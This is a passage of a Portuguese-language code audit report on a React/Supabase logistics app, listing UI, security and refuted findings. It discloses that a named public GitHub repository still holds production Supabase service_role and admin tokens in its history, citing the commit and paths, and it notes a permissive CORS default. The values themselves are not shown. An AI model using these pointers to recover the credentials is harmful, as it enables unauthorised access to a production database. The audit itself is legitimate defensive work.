- **Causa raiz:** Existem dois componentes de cartão de pedido independentes — `OrderCard` local em src/components/dashboard/OrdersTable.tsx:76 e `OrderCard` exportado em src/pages/orders/OrderCard.tsx:46 — cada um com sua própria tabela de rótulos e ícones. A da página de Pedidos foi atualizada quando os status QUOTED/ASSIGNING_DRIVER/DELIVERING entraram em src/types/index.ts:31-42 e os veículos MPV/UV_FIORINO/TRUCK330/TRUCK175 entraram no catálogo; a do dashboard não.
- **Arquivos:** `src/components/dashboard/OrdersTable.tsx`, `src/pages/orders/OrderCard.tsx`, `src/pages/DashboardRedesigned.tsx`, `src/lib/lalamoveTimeline.ts`
- **Etapas do plano:** 295


## Transversal — segurança

**2 achado(s).**


#### C-012 — O repositório está PÚBLICO no GitHub, com credenciais de produção no histórico

- **Camada:** Transversal — segurança
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O código-fonte inteiro e o histórico estão abertos na internet. No histórico está a chave que dá acesso total ao banco de produção (service_role) e o token de administração do projeto Supabase. Quem copiou antes continua com acesso mesmo se o repositório for fechado agora.
- **Evidência:**
  ```
  `GET /repos/adm01-debug/Lalamove_V2` em 23/11/2026 (API do GitHub): `"private": false`, `"visibility": "public"`. `AGENTS.md` (seção Fluxo Git) afirma o contrário: "Repo `adm01-debug/Lalamove_V2`, `main`, **privado**". No histórico alcançável: `git grep -l` em `63987c9^` acha **14 arquivos** com JWT no formato `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ…` (todos em `scripts/`) e **6 arquivos** com PAT `sbp_<40 hex>`. Valores não registrados. No HEAD atual só sobra 1 match, em `scripts/ai-context/cenarios.mjs:133`, que é fixture de teste com token falso.
  ```
- **Causa raiz:** O repositório foi tornado privado em 21/11 às 17:58 UTC, voltou a público antes das 19:14 do mesmo dia (registrado em `docs/PLANO_ESTADO_LALAMOVE_V2_2026-11-21.md`) e hoje está público de novo. A limpeza do commit `63987c9` tirou as chaves do código, mas não do histórico — e histórico público não se apaga de quem já clonou. A rotação das 3 credenciais segue pendente com o dono.
- **Arquivos:** `AGENTS.md`, `scripts/ai-context/cenarios.mjs`
- **Etapas do plano:** 003

#### B-004 — CORS das edges cai em '*' por omissao e ignora todas as origens alem da primeira

- **Camada:** Transversal — segurança
- **Severidade:** Baixa · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Duas consequencias. Se ALLOWED_ORIGINS nao estiver configurado em producao, qualquer site na internet pode chamar as funcoes do sistema a partir do navegador de um funcionario logado. E se estiver configurado com mais de um dominio (por exemplo o dominio proprio e o de preview da Vercel), so o primeiro funciona: o segundo quebra com erro de CORS sem nenhuma mensagem util.
- **Evidência:**
  ```
  supabase/functions/_shared/cors.ts:4 "const allowedOrigins = Deno.env.get('ALLOWED_ORIGINS')?.split(',').map(o => o.trim()) || ['*'];" e :7 "'Access-Control-Allow-Origin': allowedOrigins[0], // For multiple origins, you'd need to check req.headers.get('origin')". Hardcoded: supabase/functions/test-notification/index.ts:12, external-companies/index.ts:13, simulate-driver-movement/index.ts:14, job-worker/index.ts:1139, geo-admin/index.ts:26, route-analyzer/index.ts:13, external-db-bridge/index.ts:12, get-mapbox-token/index.ts:12 — alem dos 3 citados.
  ```
- **Causa raiz:** O default foi escrito para 'funcionar em qualquer ambiente' e o proprio comentario do arquivo (:2-3) adia a restricao ('In production, you should ideally restrict...'). O uso de allowedOrigins[0] foi uma simplificacao que nunca foi completada.
- **Arquivos:** `supabase/functions/_shared/cors.ts`, `supabase/functions/apply-fixes/index.ts`, `supabase/functions/seed-fix-rls/index.ts`, `supabase/functions/llm-wh/index.ts`
- **Etapas do plano:** 058
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Nao foi possivel ler o valor de ALLOWED_ORIGINS nos secrets do projeto iecgydonctmabiijadsf (sem MCP nem acesso ao painel nesta sessao). Se a variavel estiver definida com um unico dominio, o risco de origem aberta nao se materializa e sobra so a limitacao de uma origem so.

## Refutados (não reabrir)

- **Partições tracking_events_y2026m07 a m10 ficaram sem ENABLE ROW LEVEL SECURITY — GPS de julho a outubro acessível direto** — Banco — RLS e autorização. Motivo da refutação: A premissa do achado é falsa: as partições m07..m10 não existem. Elas são criadas em supabase/migrations/20260513180659_...sql:31-38, mas a migration SEGUINTE a derruba tudo — supabase/migrations/20260516114956_ae65dc31-f603-4f09-87a8-f7ff56459e41.sql:2 `DROP TABLE IF EXISTS public.tracking_events;` e :4-24 recriam o pai particionado com APENAS `tracking_events_y2026m05`, `tracking_events_y2026m06
- **Pedido recém-criado não aparece na lista: nenhuma invalidação após a criação** — Hooks e estado — dados de negócio. Motivo da refutação: Refutado: existe a invalidacao que o auditor nao viu. O diagnostico parou no `grep invalidateQueries` dentro do NewOrderDialog, mas a invalidacao esta no callback que o dialogo recebe. src/components/orders/NewOrderDialog.tsx:483-488 `setTimeout(() => { resetForm(); onOpenChange(false); onSuccess(); }, 1500);` e o unico ponto do app que renderiza o dialogo o liga ao refresh da lista: src/pages/Ord
- **useContacts não expõe o estado de salvamento do upsert — abre caminho para duplo envio** — Hooks e estado — dados de negócio. Motivo da refutação: Três fatos que o auditor não conferiu. (1) O único consumidor de `isMutating` é src/pages/ContactsPage.tsx:48, que desestrutura apenas `updateContact`/`deleteContact` e usa `busy={isMutating}` em :185 — essa tela nunca chama `upsertContact`, então a composição de src/hooks/useContacts.ts:165 está correta para quem a consome; não existe botão sem travamento. (2) O único chamador do upsert é src/com | A linha citada é real (src/hooks/useContacts.ts:165 `isMutating: updateMutation.isPending || deleteMutation.isPending,`), mas as duas consequências afirmadas caem. (1) Duplicidade é impossível no banco: supabase/migrations/20260723135010_e3a23b59-7351-4ad8-afaf-6c2a3af32f23.sql:15 `CONSTRAINT con
- **ProfilePage exibe ID e e-mail de um usuário real fixos no código quando a sessão não está carregada** — Interface — administração. Motivo da refutação: As duas linhas existem como descrito (src/pages/ProfilePage.tsx:31-32), mas o efeito afirmado — a tela mostrar esse UUID/e-mail — é inalcançável. A rota é `<Route path="/profile" element={<ProtectedRoute requiredRole="viewer"><SuspenseWrapper><ProfilePage /></SuspenseWrapper></ProtectedRoute>} />` (src/App.tsx:205) e o ProtectedRoute só renderiza os filhos depois de `authLoading` falso e `user` nã | As duas linhas existem (src/pages/ProfilePage.tsx:31-32 — `const userId = user?.id ?? '6758071f-...';` e `const userEmail = user?.email ?? 'ti@promobrindes.com.br';`), mas o comportamento afirmado não acontece: a página só é montada dentro de ProtectedRoute (src/App.tsx:205) e ProtectedRoute, em 
- **Botao 'Contatar via WhatsApp' no detalhe do pedido so mostra um aviso na tela; nenhuma mensagem e enviada** — Interface — fluxo de pedido. Motivo da refutação: Refutado: o trecho existe, mas e inalcancavel. O botao esta dentro de `{order.supplier_contact && (` (src/components/orders/OrderDetailModal.tsx:805) e o modal recebe o pedido so por prop — e usado em um unico lugar, src/pages/OrdersPage.tsx:261 `<OrderDetailModal order={selectedOrder} .../>`, com `selectedOrder` vindo do mapeamento explicito de src/hooks/useRecentOrders.ts:49-71, que monta o obje
- **Explorer da API V3 executa metodos destrutivos sem confirmacao e esconde o erro real da Lalamove** — Interface — fluxo de pedido. Motivo da refutação: REFUTADO no ponto principal: o painel não executa nada, nem GET. O botão chama `v3Mutation` → src/hooks/useLalamove.ts:183-187 `mutationFn: ({path, method, body}) => lalamove.v3Call(path, method || 'GET', body)` → src/lib/lalamove-api.ts:138-141 `v3Call: (path, method='GET', body?) => method === 'GET' ? api('v3', {...}) : apiPost('v3', body, {...})`, ou seja, action `'v3'` no gateway. E supabase/f
